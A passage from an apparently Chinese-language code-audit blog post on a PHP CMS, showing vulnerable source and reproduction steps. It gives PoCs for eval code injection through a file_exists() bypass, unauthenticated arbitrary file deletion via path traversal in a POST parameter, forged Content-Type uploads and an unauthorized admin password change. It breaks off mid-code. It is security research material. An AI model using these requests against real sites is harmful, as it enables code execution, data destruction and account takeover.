invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;  <br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<span class="hljs-comment">//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1、绕过 file_exists（）</p><p>这个函数在进行检查时，比如&#x2F;controller&#x2F;admin;&#x2F;..&#x2F;，函数允许路径中有一些特殊字符，并且遇到&#x2F;..&#x2F;会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。</p><p>那么我们构造poc:<code>Factory();phpinfo();//../</code></p><p>2、入口点</p><p>调用Factory() 的入口点在 Factory::setAction()-&gt;run(); 这里，在admin&#x2F;index.php 这个文件中得知，它包含了&#x2F;config&#x2F;run.inc.php，可以利用</p><p>3、POC</p><p><code>/admin?a=Factory();phpinfo();//../</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png" alt="20250710234248614"></p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>来到对应的功能点：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png" alt="20250712193547260"></p><p>先给 upload 随便上传一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png" alt="20250712193717272"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png" alt="20250712193754284"></p><p>删除，进行抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png" alt="20250712193827895"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png" alt="20250712193843074"></p><p>URL编码：<code>pid%5B0%5D=1.png&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>解码：</p><p><code>pid[0]=1.png&amp;chkall=on&amp;send=删除选中图片</code></p><p><code>chkall=on</code>是一个复选框</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png" alt="20250712194432977"></p><p>可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件</p><p>接下来就可以根据上面的数据构造POC：</p><p><code>pid[0]=/../1.txt&amp;chkall=on&amp;send=删除选中图片</code></p><p><code>pid%5B0%5D=/../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>路由：admin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall</p><p>在根目录准备一个1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png" alt="20250712194601104"></p><p>退出登录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png" alt="20250712194749344"></p><p>POST传参：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png" alt="20250712195154540"></p><p>上图的浏览器删不掉，换了一个成功了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png" alt="20250712195540507"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png" alt="20250712195612613"></p><h3 id="任意文章-文件（no）删除"><a href="#任意文章-文件（no）删除" class="headerlink" title="任意文章&#x2F;文件（no）删除"></a>任意文章&#x2F;文件（no）删除</h3><p>这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//删除单个文章</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(tool::<span class="hljs-title function_ invoke__">delete_file</span>(<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>())&#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;删除失败!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//删除多个文章</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h4><p>GET传参，</p><p>找到一篇文章的id</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png" alt="20250712200511140"></p><p>构造POC：<code>admin/?a=article&amp;m=delete&amp;id=2450</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png" alt="20250712200604332"></p><p>执行后发现这篇文章被删除了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png" alt="20250712200619491"></p><h4 id="delall"><a href="#delall" class="headerlink" title="delall()"></a>delall()</h4><p>功能点：此处多选删除</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png" alt="20250712201015073"></p><p>抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png" alt="20250712201031989"></p><p><code>showid%5B%5D=2449&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>同样的，构造POC：</p><p><code>showid%5B%5D=%2F..%2F1.txt&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>路由：admin&#x2F;?a&#x3D;article&amp;m&#x3D;delall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png" alt="20250712201614722"></p><p>但是只删除了文章并没有删除1.txt ？？</p><p>再认真分析一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//获取文章id</span><br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<span class="hljs-comment">//数据库查询</span><br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<span class="hljs-comment">//从数据库中获取 HTML</span><br></code></pre></td></tr></table></figure><p>直接传递<code>/../1.txt</code>作为ID值，系统会将<code>/../1.txt</code>当作文章ID去数据库查询，显然这个ID不存在</p><p>想要利用这里的漏洞，只能去更改数据库中HTML的内容，</p><p>添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>]=<span class="hljs-variable">$_art</span>[<span class="hljs-number">0</span>]-&gt;html;<br></code></pre></td></tr></table></figure><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//处理上传图片</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upLoad</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>])) &#123;<br><span class="hljs-variable">$_logoupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogoUpload</span>(<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MAX_FILE_SIZE&#x27;</span>]);<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">960</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-comment">//echo $_path;</span><br><span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">alertOpenerClose</span>(<span class="hljs-string">&#x27;图片上传成功！&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>.<span class="hljs-variable">$_path</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//构造方法，初始化</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_file</span>,<span class="hljs-variable">$_maxsize</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;maxsize = <span class="hljs-variable">$_maxsize</span> / <span class="hljs-number">1024</span>;<br><span class="hljs-variable language_">$this</span>-&gt;type = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;path = ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.UPLOGO;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;tmp = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkType</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPath</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">moveUpload</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了</p><h3 id="任意文件上传-2"><a href="#任意文件上传-2" class="headerlink" title="任意文件上传-2"></a>任意文件上传-2</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//xheditor编辑器专用上传</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xhUp</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br><span class="hljs-variable">$_fileupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileUpload</span>(<span class="hljs-string">&#x27;filedata&#x27;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-variable">$_err</span>=<span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_msg</span>=<span class="hljs-string">&quot;&#x27;..<span class="hljs-subst">$_path</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">650</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&#x27;err&#x27;:&#x27;&quot;</span>.<span class="hljs-variable">$_err</span>.<span class="hljs-string">&quot;&#x27;,&#x27;msg&#x27;:&quot;</span>.<span class="hljs-variable">$_msg</span>.<span class="hljs-string">&quot;&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;警告：由于非法操作导致上传失败！&#x27;</span>);<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>代码中的文件名以时间+100到1000之间的随机数进行重命名</p><p>同样也是检查的传入的Content-Type的值</p><h3 id="未授权更改管理员账号密码"><a href="#未授权更改管理员账号密码" class="headerlink" title="未授权更改管理员账号密码"></a><strong>未授权更改管理员账号密码</strong></h3><p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息</p><p>根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>            &#125;<br>        &#125;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$_sql</span>=<span class="hljs-string">&quot;UPDATE</span><br><span class="hljs-string">                    my_admin</span><br><span class="hljs-string">                SET</span><br><span class="hljs-string">                    username=&#x27;<span class="hljs-subst">$this</span>-&gt;username&#x27;,</span><br><span class="hljs-string">                    password=&#x27;<span class="hljs-subst">$this</span>-&gt;password&#x27;</span><br><span class="hljs-string">                WHERE</span><br><span class="hljs-string">                    id=1</span><br><span class="hljs-string">                LIMIT 1&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$_sql</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 